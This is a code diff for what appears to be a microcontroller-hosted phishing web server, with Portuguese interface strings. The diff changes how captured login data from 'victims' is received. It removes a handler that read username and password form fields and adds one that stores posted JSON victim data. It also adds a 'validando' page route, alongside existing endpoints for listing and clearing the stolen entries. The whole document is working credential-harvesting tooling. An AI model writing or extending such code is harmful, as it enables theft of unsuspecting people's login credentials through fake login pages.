@@ -29,13 +29,6 @@ String input(String argName) {
 }
 
 
-void posted() {
-    String username = input("username");
-    String password = input("password");
-    victims->addVictim(username, password);
-}
-
-
 void clear() {
     victims->clearVictims();
 }
@@ -61,6 +54,18 @@ void handleFileRequest(String path) {
 }
 
 
+void postVictimData() {
+    if (webServer.hasArg("plain")) {
+        String jsonString = webServer.arg("plain");
+        victims->addVictimJsonText(jsonString);
+        webServer.send(201, "application/json", "{\"status\": \"OK\"}");
+
+    } else {
+        webServer.send(400, "application/json", "{\"erro\": \"Requisição sem corpo\"}");
+    }
+}
+
+
 void setup() {
     Serial.begin(9600);
     bootTime = lastActivity = millis();
@@ -79,15 +84,15 @@ void setup() {
     webServer.on("/", []() { handleFileRequest("/index.html"); });
     
     webServer.on("/pass", []() { handleFileRequest("/pass.html"); });
-    
+    webServer.on("/validando", []() { handleFileRequest("/validando.html"); });
+
     webServer.on("/clear", []() {
         clear();
         webServer.send(200, "text/plain", "Deletado com sucesso");
     });
     
     webServer.on("/post", []() {
-        posted();
-        handleFileRequest("/validando.html");
+        postVictimData();
     });
 
     webServer.on("/victimsjson", []() {
